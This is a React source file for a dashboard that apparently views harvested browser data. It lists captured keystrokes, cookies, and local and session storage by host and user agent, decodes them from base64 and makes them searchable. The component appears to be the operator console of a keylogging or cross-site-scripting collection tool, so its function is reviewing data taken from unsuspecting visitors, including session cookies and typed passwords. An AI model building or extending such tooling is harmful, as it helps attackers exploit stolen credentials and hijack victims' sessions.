import React, { useEffect, useMemo, useState } from 'react';

import moment from 'moment-timezone';
import { uniq } from 'lodash';
import axios from 'axios';

import { MdCookie, MdStorage } from 'react-icons/md';

import {
  Card,
  CardBody,
  Center,
  Flex,
  Icon,
  Input,
  Select,
  Stack,
  Table,
  TableContainer,
  Tbody,
  Td,
  Text,
  Th,
  Thead,
  Tr,
  useColorModeValue,
} from '@chakra-ui/react';

import LogModal, { parseKeystrokes } from './LogModal';

const getLogs = setLogs =>
  axios.get(`/api/logs`, { withCredentials: true }).then(response => setLogs(response.data.logs));

const getHosts = logs => uniq(logs?.map(({ host }) => host));

const filterLogs = (logs, host) => logs.filter(log => (host ? log.host === host : log));

const processLogs = logs =>
  logs.map(log => ({
    ...log,
    keystrokes: parseKeystrokes(log.keystrokes),
  }));

const searchKeystrokes = (logs, searchTerm) =>
  logs.filter(
    log =>
      [
        JSON.parse(atob(log.keystrokes)).join(''),
        atob(log.cookies),
        atob(log.local_storage),
        atob(log.session_storage),
      ]
        .join('')
        .toLowerCase()
        .indexOf(searchTerm.toLowerCase()) > -1,
  );

const Logs = () => {
  const logsHeaderBg = useColorModeValue('gray.300', 'gray.700');
  const logsHeaderInputBg = useColorModeValue('gray.100', 'gray.600');
  const logsTableHeaderInputBg = useColorModeValue('gray.200', 'gray.600');

  const [logs, setLogs] = useState([]);
  const [searchTerm, setSearchTerm] = useState(null);
  const [selectedHost, setSelectedHost] = useState(null);
  const [showDetails, setShowDetails] = useState(null);

  useEffect(() => {
    getLogs(setLogs);
  }, []);

  const selectedLog = useMemo(
    () => showDetails && logs?.find(log => log.id === showDetails),
    [logs, showDetails],
  );

  const filteredLogs = useMemo(() => {
    let filtered = filterLogs(logs, selectedHost);
    if (searchTerm) {
      filtered = searchKeystrokes(filtered, searchTerm);
    }
    return processLogs(filtered);
  }, [logs, searchTerm, selectedHost]);

  return (
    <Stack spacing='0'>
      {selectedLog && (
        <LogModal
          selectedLog={selectedLog}
          setShowDetails={setShowDetails}
          showDetails={showDetails}
        />
      )}
      <Card bg={logsHeaderBg} borderRadius='sm' direction={{ base: 'column', sm: 'row' }}>
        <CardBody>
          <Select
            bg={logsHeaderInputBg}
            onChange={e => setSelectedHost(e.target.value)}
            placeholder='Filter by Host'
          >
            {getHosts(logs).map(host => (
              <option key={`hostOption/${host}`} value={host}>
                {host}
              </option>
            ))}
          </Select>
        </CardBody>
        <CardBody>
          <Input
            bg={logsHeaderInputBg}
            onChange={e => setSearchTerm(e.target.value)}
            placeholder='Search Logs'
            value={searchTerm}
          />
        </CardBody>
      </Card>
      <TableContainer borderRadius='sm' maxHeight='500px' overflowY='auto'>
        <Table>
          <Thead bg={logsTableHeaderInputBg} position='sticky' top={0}>
            <Tr>
              <Th>Host</Th>
              <Th>Date</Th>
              <Th>User Agent</Th>
              <Th>Keystrokes</Th>
              <Th>Cookies</Th>
              <Th>Storage</Th>
            </Tr>
          </Thead>
          <Tbody>
            {filteredLogs.map(
              ({
                cookies,
                created_at,
                host,
                id,
                keystrokes,
                local_storage,
                session_storage,
                user_agent,
              }) => (
                <Tr
                  key={`log/${created_at}/${host}`}
                  onClick={() => setShowDetails(id)}
                  sx={{
                    cursor: 'pointer',
                  }}
                >
                  <Td>{host}</Td>
                  <Td>{moment(created_at).format('MMM DD, YYYY hh:mm a')}</Td>
                  <Td>
                    <Flex
                      alignItems='center'
                      flexDirection='row'
                      height='75px'
                      justifyContent='center'
                      width='250px'
                    >
                      <Text
                        style={{
                          height: '100%',
                          overflowX: 'scroll',
                          whiteSpace: 'pre-line',
                          width: '250px',
                        }}
                      >
                        {user_agent}
                      </Text>
                    </Flex>
                  </Td>
                  <Td>
                    <Flex
                      alignItems='center'
                      flexDirection='row'
                      height='75px'
                      justifyContent='center'
                      width='300px'
                    >
                      <Text
                        style={{
                          height: '100%',
                          overflowX: 'scroll',
                          whiteSpace: 'pre-line',
                          width: '300px',
                        }}
                      >
                        {keystrokes}
                      </Text>
                    </Flex>
                  </Td>
                  <Td>
                    {cookies && (
                      <Center>
                        <Icon as={MdCookie} />
                      </Center>
                    )}
                  </Td>
                  <Td>
                    {(local_storage || session_storage) && (
                      <Center>
                        <Icon as={MdStorage} />
                      </Center>
                    )}
                  </Td>
                </Tr>
              ),
            )}
          </Tbody>
        </Table>
      </TableContainer>
    </Stack>
  );
};

export default Logs;
